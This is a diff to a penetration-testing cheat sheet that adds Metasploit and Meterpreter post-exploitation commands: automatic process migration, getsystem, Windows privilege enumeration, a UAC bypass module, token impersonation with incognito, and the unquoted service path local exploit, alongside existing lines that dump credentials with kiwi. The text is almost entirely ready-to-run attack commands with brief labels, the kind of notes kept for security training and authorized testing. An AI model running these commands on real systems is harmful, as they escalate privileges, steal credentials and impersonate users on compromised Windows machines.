@@ -18,6 +18,16 @@ info
 ```
 
 # Meterpreter
+### Migrate to Another Process Automatically
+```bash
+# As script
+run post/windows/manage/migrate
+
+# As module
+use post/windows/manage/migrate
+set SESSION <Session #>
+run
+```
 ### Migrate to Another Process By Name
 ```bash
 migrate -N <Process Name>.<Extension>
@@ -57,6 +67,48 @@ sessions -i <Session #>
 load kiwi
 help
 creds_all
+```
+### Escalate Privileges
+#### Linux PrivEsc
+#### Windows PrivEsc
+##### Escalate Privileges with GetSystem
+```bash
+# Only works with Windows
+getsystem
+```
+##### Windows Gather Privileges Enumeration
+```bash
+use post/windows/gather/win_privs
+set SESSION <Session #>
+run
+```
+##### Escalate Privileges Under UAC
+```bash
+# Determine if UAC is enabled, if so, getsystem will fail
+use post/windows/gather/win_privs
+set SESSION <Session #>
+run
+
+# If UAC is enabled
+search bypassuac
+use
+set SESSION <Session #>
+exploit
+
+getsystem
+```
+##### Escalate with Incognito
+```bash
+# From Meterpreter shell
+use incognito
+list_tokens -u
+impersonate_token <Token Name> # Escape \'s.
+```
+##### Exploit Unquoted Service Paths
+```bash
+use exploit/windows/local/unquoted_service_path
+set SESSION <Session #>
+exploit
 ```
 
 # Client-Side Exploits
